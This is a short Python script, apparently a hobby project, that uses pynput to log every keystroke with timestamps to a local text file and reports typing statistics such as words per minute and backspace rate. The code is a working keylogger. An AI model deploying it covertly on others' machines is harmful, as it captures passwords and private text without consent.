from datetime import datetime
from pynput.keyboard import Listener
import time

keystrokes = 0
word_count = 0
error = 0
starttime = time.time()

#time
def active_runtime():
    global total_time
    total_time = time.time() - starttime
    hours, remainder = divmod(int(total_time), 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

#words per min
def calculate_wpm():
    total_time = time.time() - starttime
    if total_time < 1:  # prevent division by 0
        return 0.0
    # wpm: (total characters/5)/min
    wpm = (keystrokes / 5) / (total_time / 60)
    return round(wpm, 2)

#backspace error
def back_error():
    if keystrokes == 0:
        return 0
    backerror = (error/keystrokes)*100
    return round(backerror,2)

#keystrokes
def Keylogger(key):
    global keystrokes, word_count, error, backerror
    keystrokes += 1
    letter = str(key).replace("'", "")

# special keys
    if letter == "Key.space":
        letter = " "
    elif letter == "Key.ctrl_l" or letter == "Key.ctrl_r":
        letter = "[Ctrl]"
    elif letter == "Key.alt_l" or letter == "Key.alt_r":
        letter = "[Alt]"
    elif letter == "Key.shift":
        letter = "[Shift]"
    elif letter == "Key.enter":
        letter = "\n"
    elif letter == "Key.backspace":
        letter = "[Backspace]"
        error += 1
    elif letter == "Key.tab":
        letter = "[Tab]"
    elif letter == "Key.caps_lock":
        letter = "[Caps Lock]"
    elif letter == "Key.delete":
        letter = "[Delete]"
    elif letter == "Key.function":
        letter = "[Function]"
#exit hotkey
    elif letter == "Key.esc":
        letter = "[Exit hotkey pressed]"
        timestamp = datetime.now().strftime("[%y-%m-%d %H:%M:%S] ")
        with open("logfinal.txt", "a", encoding="utf-8") as file:
            file.write(f'''\n{timestamp}{letter}\n
                           Total keystrokes: {keystrokes}
                           Active runtime: {active_runtime()}
                           Words per minute: {calculate_wpm()}
                           Backspace errors: {back_error()}\n
''')
        return False

#timestamp
    if letter:
        timestamp = datetime.now().strftime("[%y-%m-%d %H:%M:%S] ")
        with open("logfinal.txt", "a") as file:
            file.write(f"{timestamp}{letter}")

with Listener (on_press = Keylogger) as listener:
    listener.join()